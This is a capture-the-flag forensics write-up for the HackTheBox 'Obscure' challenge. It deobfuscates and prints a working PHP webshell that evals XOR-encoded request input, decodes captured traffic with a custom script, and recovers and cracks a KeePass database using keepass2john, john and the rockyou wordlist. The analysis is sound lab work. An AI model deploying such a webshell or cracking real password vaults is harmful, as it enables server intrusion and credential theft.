# Obscure
## HackTheBox Forensics Challenge

### Initial files
This challenge provides 2 challenge files when first downloaded. These were `support.php` and a pcap file containing some traffic. Additionally, it indicated that `support.php` was a webshell and that the pcap contained traffic hitting the webshell. 

#### support.php
A webshell! Who doesn't love webshells. This one isn't really a webshell, but we can pretend. To start off I needed to deobfuscate it. To do so, I threw the entire thing into cyberchef and did a find/replace on `u)` and got rid of all of them. This is because line 8 of our webshell does so as well:

`$u=str_replace('u)','',$V.$d.$P.$c.$B);`

This gives us something we can kind of work with: 

```php
<?php
$V='$k="80e32263";$kh="6f8af44abea0";$kf="351039f4a7b5";$p="0UlYyJHG87EJqEz6";function x($';
$P='++){$o.=$t{$i}^$k{$j};}}return $o;}if(@preg_match("/$kh(.+)$kf/",@file_get_contents(';
$d='t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i';
$B='ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");}';
$N=str_replace('','','create_function');
$c='"php://input"),$m)==1){@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));$o=@';


$u=str_replace('','',$V.$d.$P.$c.$B);
$x=$N('',$;$x());
?>
```

It's still kind of ugly though. To clean it up some more let's take those variables and put 'em all together like how it does in the variable `$u`. Additionally, we can take that big string and format it nicely for php syntax. Lastly, we can get rid of those `str_replace()` function calls becuase we've already gone ahead and replaced our strings. Our final output looks like this:

```php
<?php
	$k="80e32263";
	$kh="6f8af44abea0";
	$kf="351039f4a7b5";
	$p="0UlYyJHG87EJqEz6";
	function x($t,$k){
		$c=strlen($k);
		$l=strlen($t);
		$o="";for($i=0;$i<$l;){
			for($j=0;($j<$c&&$i<$l);$j++,$i++){
				$o.=$t{$i}^$k{$j};
			}
		}
		return $o;
	}
	if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){
		@ob_start();
		@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
		$o=@ob_get_contents();
		@ob_end_clean();
		$r=@base64_encode(@x(@gzcompress($o),$k));
		print("$p$kh$r$kf");
	}
?>
```

To break it down, we've got 4 variables at the top that look kinda like gibberish, which they are, pretty much.... The function called `x()` just XOR's two strings together and returns the XOR'd string. 

Then we do an if statement to do a regex check and see if the string read from stdin (in this case that is referenced as `php://input`) matches the format of our variable `$kh + ` some stuff `+ $kf`. If the check passes, we take the input string, base64 decode it, XOR it with the variable `$k` gzuncompress it, then eval and put it in a variable called `$o`. Lovely. Then we'll take another variable called `$r` and in ther we'll re-compress `$o`, XOR it with `$k` again, then re-encode it with base64, then print out the whole thing with some other fun stuff appended.

#### The pcap file

The pcap file shows some traffic hitting our webshell, as well as the corresponding responses. We can filter for just POST requests and we see 4. If we follow the HTTP stream, we can see the response that `support.php` is spitting out for the given requests. Here is an example from TCP stream 1:

`0UlYyJHG87EJqEz66f8af44abea0QKxO/n6DAwXuGEoc5X9/H3HkMXv1Ih75Fx1NdSPRNDPUmHTy351039f4a7b5`

We can clearly see that the first chunk of this, `0UlYyJHG87EJqEz66f8af44abea0`, comes from the variables `$p` and `$kh`. Additionally, that last part clearly comes from the variable `$kf` being appended. So the bit in the middle is the juicy part: `QKxO/n6DAwXuGEoc5X9/H3HkMXv1Ih75Fx1NdSPRNDPUmHTy` Lets try and see if we can decode it. 


#### My decode script

I wrote a quick decode script, stealing the logic straight from the webshell. Here is my entire script. I yoinked the XOR function, and in this case just base64 decoded, where encoding happened, and gzuncompressed where gzcompression happened. 

```php
<?php

$k="80e32263";
$kh="6f8af44abea0";
$kf="351039f4a7b5";
$p="0UlYyJHG87EJqEz6";
function x($t,$k){
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;){
		for($j=0;($j<$c&&$i<$l);$j++,$i++){
			$o.=$t[$i]^$k[$j];
		}
	}
	return $o;
}

$userinput = file_get_contents("php://input");

$base64 = base64_decode($userinput);

$xor = x($base64, $k);

$result = gzuncompress($xor);

echo "Result: ".$result;

?>
```

I spun up a quick php webserver locally:
`php.exe -S 127.0.0.1:8080 -t <path_to_decode.php>`

Then using postman I was able to hit the php script I wrote and change the body of the request to include the string we wanted to decode from the pcap. I tried it with all of the streams that hit `support.php`. Most were uninteresting. The output of the command `id` being run, for example. What was interesting, however was this, the output of the command ls. Notably, the file `pwdb.kdbx`:

```
Result: total 24K
drwxr-xr-x 2 developer developer 4.0K May 21 20:37 .
drwxr-xr-x 3 root root 4.0K May 20 21:28 ..
-rw-r--r-- 1 developer developer 220 May 20 21:28 .bash_logout
-rw-r--r-- 1 developer developer 3.5K May 20 21:28 .bashrc
-rw-r--r-- 1 developer developer 675 May 20 21:28 .profile
-rw-r--r-- 1 developer developer 1.6K May 21 20:37 pwdb.kdbx
```

Additionally, there was a really long response in one of the TCP streams, which, when decoded produced this: 

`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`


Lets base64 decode it, since its clearly base64 encoded, and see what on earth it is. I wrote it to a file and ran `file` on it, and lo, it's a keepass database:

`pass.kbdx: Keepass password database 2.x KDBX`

#### Password Cracking

I took oru password database that we have and used the tool that comes with kali called `keepass2john` to extract the password hash from it. I wrote it to a file. 

`keepass2john pass.kbdx > htb4john.txt`

Then, it's as easy as running your hash-cracking tool of choice to crack the hash

`john --wordlist=/usr/share/wordlists/rockyou.txt htb4john.txt`
```
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
do_it_yourself >:(         (pass.kbdx)     
1g 0:00:00:06 DONE (2023-10-16 00:04) 0.1626g/s 3488p/s 3488c/s 3488C/s fungus..bliss
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Lastly, we open the database file in keepass, unlock it with the password we cracked above, and there we have our flag! 

Lots of fun with some network traffic forensics, some php deobfuscation, and a quick script to reverse the encoding being done. What's not to like?? Thanks for reading if you've made it this far :D 